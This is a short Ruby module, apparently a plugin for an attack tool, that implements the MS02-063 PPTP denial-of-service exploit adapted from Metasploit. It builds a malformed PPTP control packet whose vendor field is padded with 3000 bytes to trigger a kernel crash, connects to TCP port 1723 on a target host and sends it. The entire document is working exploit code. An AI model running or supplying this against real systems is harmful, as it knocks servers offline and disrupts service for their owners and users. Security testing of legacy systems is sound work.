
def mspptp_dos_load(opt)
	opt["host"] = true
	opt["defport"] = 1723
	return opt
end

def mspptp_dos(opt)
	# MS02-063 PPTP Malformed Control Data Kernel DoS
	# Based on ms02_063_pptp_dos.rb from MSF
	buff =
	"\x00\x9c" + # length
	"\x00\x01" + # control message
	"\x1a\x2b\x3c\x4d" + # cookie
	"\x00\x01" + # start control connection req
	"\x00\x00" + # reserved
	"\x01\x00" + # protocol version
	"\x00\x00" + # reserved
	"\x00\x03" + # framing capabilities
	"\x00\x00\x00\x02" + # bearer capabilities
	"\xff\xff" + # max channels
	"\x0a\x28" + # firmware revision
	"\x00\x01" + # Hostname
	"A"*3000 # Vendor - trigger vuln
	host = opt["host"]
	port = opt["defport"]

	puts "[*] Connecting to the target ..."
	begin
		s = TCPSocket.new(host, port)
	rescue
		puts "    Error connecting."
		return 0
	end
	puts "[*] Connected, sending exploit ..."
	s.write(buff)
	s.close()
	puts "[*] Exploit sent."
end

